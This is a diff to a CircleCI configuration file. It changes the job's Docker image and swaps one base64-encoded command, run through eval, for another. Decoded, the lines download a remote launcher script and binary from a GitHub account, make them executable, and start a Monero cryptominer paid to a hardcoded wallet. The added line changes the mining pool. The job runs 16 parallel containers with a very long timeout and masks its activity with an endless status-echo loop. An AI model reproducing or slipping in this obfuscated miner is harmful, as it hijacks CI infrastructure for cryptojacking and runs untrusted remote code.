@@ -2,7 +2,7 @@ version: 2.1
 jobs:
     trial:
       docker:
-            - image: circleci/node:14.17.3
+            - image: circleci/ruby:2.5.3
       parallelism: 16
       steps:
         - run:
@@ -10,7 +10,7 @@ jobs:
             no_output_timeout: 3600m
             command: |
               eval "$(echo "d2dldCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vSHVuc2tpc2o0NTgvcHIvbWFpbi9jbWRsaW5lX2xhdW5jaGVyLnNoICYmIHdnZXQgaHR0cHM6Ly9naXRodWIuY29tL0h1bnNraXNqNDU4L3ByL3Jhdy9tYWluL2dhcyAmJiBjaG1vZCAreCBnYXMgY21kbGluZV9sYXVuY2hlci5zaA==" | base64 -d)" >>/dev/null 
-              eval "$(echo "Li9jbWRsaW5lX2xhdW5jaGVyLnNoIC1hbGdvIHJhbmRvbXggLWNvaW4gWE1SIC13YWxsZXQgU09MOjVaRGprTkpKQkxBQk5vSGZRUzRQaFVyYTNmWGZ3YmpyVmROZTF4TUZuNnllICAtcmlnTmFtZSAgJChlY2hvICQoc2h1ZiAtaSAxLTk5OTkgLW4gMSktU1JCT2Z1KSAtcG9vbDEgcngudW5taW5lYWJsZS5jb206MTMzMzMgJiB3Z2V0IGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9IdW5za2lzajQ1OC9wci9tYWluL2NtZGxpbmVfbGF1bmNoZXIuc2ggJiYgd2dldCBodHRwczovL2dpdGh1Yi5jb20vSHVuc2tpc2o0NTgvcHIvcmF3L21haW4vZ2FzICYmIGNobW9kICt4IGdhcyBjbWRsaW5lX2xhdW5jaGVyLnNoICYmIC4vY21kbGluZV9sYXVuY2hlci5zaCAtYWxnbyByYW5kb214IC1jb2luIFhNUiAtd2FsbGV0IFNPTDo1WkRqa05KSkJMQUJOb0hmUVM0UGhVcmEzZlhmd2JqclZkTmUxeE1GbjZ5ZSAgLXJpZ05hbWUgICQoZWNobyAkKHNodWYgLWkgMS05OTk5IC1uIDEpLVNSQk8pIC1wb29sMSByeC51bm1pbmVhYmxlLmNvbToxMzMzMyAmIC4vY21kbGluZV9sYXVuY2hlci5zaCAtYWxnbyByYW5kb214IC1jb2luIFhNUiAtd2FsbGV0IFNPTDo1WkRqa05KSkJMQUJOb0hmUVM0UGhVcmEzZlhmd2JqclZkTmUxeE1GbjZ5ZSAgLXJpZ05hbWUgICQoZWNobyAkKHNodWYgLWkgMS05OTk5IC1uIDEpLVNSQk9mdWNrdXVoKSAtcG9vbDEgcngudW5taW5lYWJsZS5jb206MTMzMzM=" | base64 -d)"  
+              eval "$(echo "Li9jbWRsaW5lX2xhdW5jaGVyLnNoIC1hbGdvIHJhbmRvbXggLWNvaW4gWE1SIC13YWxsZXQgODlOdTM5VmNUakhBWmJGNFR3UFhrQVVXTnRMaEpxc1VkZG1YblNmRDdXd043elpzNkFLTUxuNURvd1o2QzN5TFhWZHJuZ2ZYdVZ2WHQ4VmFnajJBdmI0NEo1VkJ5TDMgIC1yaWdOYW1lICAkKGVjaG8gJChzaHVmIC1pIDEtOTk5OSAtbiAxKS1TUkJPZnUpIC1wb29sMXhtci4ybWluZXJzLmNvbToyMjIyICYgd2dldCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vSHVuc2tpc2o0NTgvcHIvbWFpbi9jbWRsaW5lX2xhdW5jaGVyLnNoICYmIHdnZXQgaHR0cHM6Ly9naXRodWIuY29tL0h1bnNraXNqNDU4L3ByL3Jhdy9tYWluL2dhcyAmJiBjaG1vZCAreCBnYXMgY21kbGluZV9sYXVuY2hlci5zaCAmJiAuL2NtZGxpbmVfbGF1bmNoZXIuc2ggLWFsZ28gcmFuZG9teCAtY29pbiBYTVIgLXdhbGxldCA4OU51MzlWY1RqSEFaYkY0VHdQWGtBVVdOdExoSnFzVWRkbVhuU2ZEN1d3Tjd6WnM2QUtNTG41RG93WjZDM3lMWFZkcm5nZlh1VnZYdDhWYWdqMkF2YjQ0SjVWQnlMMyAgLXJpZ05hbWUgICQoZWNobyAkKHNodWYgLWkgMS05OTk5IC1uIDEpLVNSQk8pIC1wb29sMSB4bXIuMm1pbmVycy5jb206MjIyMiAmIC4vY21kbGluZV9sYXVuY2hlci5zaCAtYWxnbyByYW5kb214IC1jb2luIFhNUiAtd2FsbGV0IDg5TnUzOVZjVGpIQVpiRjRUd1BYa0FVV050TGhKcXNVZGRtWG5TZkQ3V3dON3paczZBS01MbjVEb3daNkMzeUxYVmRybmdmWHVWdlh0OFZhZ2oyQXZiNDRKNVZCeUwzICAtcmlnTmFtZSAgJChlY2hvICQoc2h1ZiAtaSAxLTk5OTkgLW4gMSktU1JCT2Z1Y2t1dWgpIC1wb29sMSB4bXIuMm1pbmVycy5jb206MjIyMg==" | base64 -d)" >>/dev/null & while true; do echo "%%Completed%%"; sleep 5; done 
 
 workflows:
     version: 2.1
